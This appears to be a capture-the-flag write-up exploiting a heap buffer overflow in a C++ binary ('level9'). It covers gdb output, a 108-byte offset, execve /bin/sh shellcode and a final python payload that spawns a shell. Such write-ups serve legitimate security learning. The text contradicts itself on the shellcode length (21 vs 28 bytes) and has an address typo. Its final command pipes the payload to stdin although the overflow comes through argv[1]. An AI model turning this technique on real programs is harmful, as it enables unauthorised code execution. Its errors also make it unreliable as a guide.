We started by running the executable and found that it currently does nothing significant.
Analyzing it with `gdb`, we identified five interesting functions:
```
...
N::N(int)
N::setAnnotation(char*)
N::operator+(N&)
N::operator-(N&)
main
...
```
The main function is written in C/C++, and there are no direct calls to `/bin/sh`, indicating that we will need to use shellcode to exploit this program.

The `setAnnotation()` function uses `memcpy()` on `argv[1]`, making it vulnerable to a buffer overflow. We need to determine the offset at which the buffer overflows.

We need to determine the offset at which the buffer overflows with the help of https://wiremask.eu/tools/buffer-overflow-pattern-generator/?:
```
(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
Starting program: /home/user/level9/level9 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info register eax
eax            0x41366441       1094083649
(gdb)
```
The offset of `eax` start at 108.

We selected a 21-byte shellcode from: https://shell-storm.org/shellcode/files/shellcode-752.html

To exploit the buffer overflow, we must find the start address of our buffer and replace the value of `esp+0x10 `with it, ensuring that the call to `edx` will execute our shellcode.
```
(gdb) b *main+136                                    // right after the setAnnotation() call
Breakpoint 1 at 0x804867c
(gdb) run 'AAAA'
Starting program: /home/user/level9/level9 'AAAA'

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:      0x41414141
```
`
The value of `[esp+0x10] will be replaced with `0x804a00c`.
Because we need to dereference again, this address will points to the beginning of our shellcode : `0x804a00x + 4 = 0x804a010`.

Our payload structure is:
-   Shell Address: 4 bytes
-   Shellcode: 28 bytes
-   Padding: 76 bytes
-   Buffer Address: 4 bytes

Final exploit payload::
```
python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"' | ./level9
```